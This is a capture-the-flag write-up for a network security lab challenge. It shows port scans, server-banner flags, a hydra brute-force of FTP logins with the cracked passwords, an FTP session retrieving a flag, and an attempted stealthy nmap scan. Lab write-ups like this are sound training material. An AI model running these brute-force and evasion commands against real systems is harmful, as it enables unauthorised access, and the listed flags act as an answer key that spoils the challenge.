# Net Sec Challenge

## Challenge Questions

I'll do a `tools/enumeration/RustScan/target/release/rustscan -a 10.10.185.143 -u 5000 -- -sC -sV --vv --script vuln` which delivers nearly all the answers to the following questions.

### What is the highest port number being open less than 10,000?
```
8080
```

### There is an open port outside the common 1000 ports; it is above 10,000. What is it?
```
10021
```

### How many TCP ports are open?
These scanned protocols on the ports are all based on TCP.
```
6
```

### What is the flag hidden in the HTTP server header?
```sh
80/tcp    open  http        syn-ack lighttpd
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-server-header: lighttpd THM{web_server_25352}
```

### What is the flag hidden in the SSH server header? 
```sh
SF-Port22-TCP:V=7.92%I=7%D=10/16%Time=616A0C7A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
```
```
THM{946219583339}
```
### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

* `10021/tcp open  ftp         syn-ack vsftpd 3.0.3`
```
vsftp 3.0.3
```

### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

Some bruteforcing via hydra
```sh
[whackx@manbox ~]$ hydra -L users -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ftp://10.10.185.143:10021
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-16 01:35:05
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ftp://10.10.185.143:10021/
[10021][ftp] host: 10.10.185.143   login: eddie   password: jordan
[10021][ftp] host: 10.10.185.143   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-16 01:35:36
```

Log in as `quinn`, download the flag via `get ftp_flag.txt`.
```
[whackx@manbox ~]$ ftp 10.10.185.143 10021
Connected to 10.10.185.143.
220 (vsFTPd 3.0.3)
Name (10.10.185.143:whackx): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Sep 20 08:36 .
drwxr-xr-x    2 1002     1002         4096 Sep 20 08:36 ..
-rw-r--r--    1 1002     1002          220 Sep 14 07:43 .bash_logout
-rw-r--r--    1 1002     1002         3771 Sep 14 07:43 .bashrc
-rw-r--r--    1 1002     1002          807 Sep 14 07:43 .profile
-rw-------    1 1002     1002          723 Sep 20 08:27 .viminfo
-rw-rw-r--    1 1002     1002           18 Sep 20 08:27 ftp_flag.txt
226 Directory send OK.
```

### Browsing to http://10.10.185.143:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

At first, I tried to be stealthy with something like the following.
```sh
[whackx@manbox ~]$ sudo nmap -T1 -sN -ff 10.10.185.143 -vv
```
That did not not work. So, I spun up an attack box and iterated through every flag possible.
At some point the flag came up on the website.
